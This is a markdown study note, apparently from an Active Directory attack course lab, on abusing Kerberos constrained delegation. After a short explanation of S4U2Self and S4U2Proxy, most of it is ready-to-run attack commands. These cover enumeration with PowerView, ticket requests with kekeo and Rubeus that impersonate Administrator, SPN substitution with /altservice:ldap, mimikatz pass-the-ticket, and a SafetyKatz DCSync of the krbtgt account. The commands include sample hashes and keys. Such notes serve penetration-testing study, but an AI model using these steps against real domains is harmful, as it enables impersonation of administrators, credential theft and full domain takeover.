# Constrained Delegation
Microsoft launched constrained delegation where a user tries to authenticate to a service(ex: web service) without using kerberose example form based authentication. In unconstrained delegation if a user is internal member they request their tgt request ST for web service provides TGT and ST to web service server the web service server then uses the provided TGT to request ST for database server to display the specific dynamic content to that user but every user may not be a domain joined user so microsoft launched constrained delegation. The main purpose of constrained delegation is to enable a trusted service to access specific resources on behalf of a user, without granting it excessive permissions unlike Unconstrained delegation which allows a service to impersonate a user and delegate their credentials to any other service without any restrictions. This means that the service has full control over the delegated credentials and can access any resource on behalf of the user but in constrained delegation allows access only to specified services on specified computers as a user. 

- A user alex authenticates to web service(running with service account websvc) using form based authentication.
- The web service requests ticket for alex's account from authentication server itself(in this step in unconstrained delegation the user object would themselves ask for TGT and ask ST for web service themselves from the DC)
- The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that alex's account is not blocked for delegation. If OK it returns a forwardable ticket for Joe's account (S4U2Self).
- The service then passes this ticket back to the ticket granting server itself and requests a service ticket for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service.
- The KDC checks the msDS-AllowedToDelegateTofield on the websvcaccount. If the service is listed it will return a service ticket for dcorp-mssql(S4U2Proxy).
- The web service can now authenticate to the CIFS on dcorp-mssql as alex using the supplied TGS.

# Problem with this architecture

## Problem 1
Here, the user who authenticated to the web server can be any user since it is sole responsibility of web service server to request TGT for a user, request ST for other services on behalf of that user, etc If user alex authenticated to the web server the websvc can request ST on behalf of administrator user as well, Meaning if we compromise websvc user or server with constrained delegation enabled on it we can access any services listed as msDS-AllowedToDelegateTofield as any user(ex: domain admin)

### Enumerate users and computers with constrained delegation enabled
Here users means service accounts like websvc not normal domain users.

#### Using POwerView
```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

#### Using ADModule
```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

##### How to read the output?
See properties samaccountname, useraccesscontrol and msds-allowedtodelegateto properties and read like as an attackr if i compromise samaccountname(websvc) user i am able to access CIFS/dcorp-mssql.dollarcorp.moneycorp.local(msds-allowedtodelegateto) as any user.

# Abuse
- After getting hash of the service account which has constrained delegation allowed to certain service
- Use over pass the hash to open elevated shell as that user then...

##### Using kekeo
- Using asktgt from kekeo above step 2 and 3
```
kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
```
- Using s4u from Kekeo, we request a TGS
```
tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```
- Using mimikatz inject the ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```
- Access it
```
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

##### Abusing using rubeus
Here, we are requesting a TGT and TGS in a single command.
```
Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
```
```
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$ 
```

## Problem 2(major problem)
Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified meaning you can access multiple services on that single machine not only the specified service in msds-allowedtodelegateto attribute.

### Abuse
- Frst get the domain computers where constrained delegation is enabled by ```Get-DomainComputer -TrustedToAuth```
- Get the hash of this machine after this suppose it has msds-allowedtodelegateto TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL using rubeus pass altservice parameter.

```
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```
- After injection, we can run DCSync:
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync/user:dcorp\krbtgt" "exit" 
```

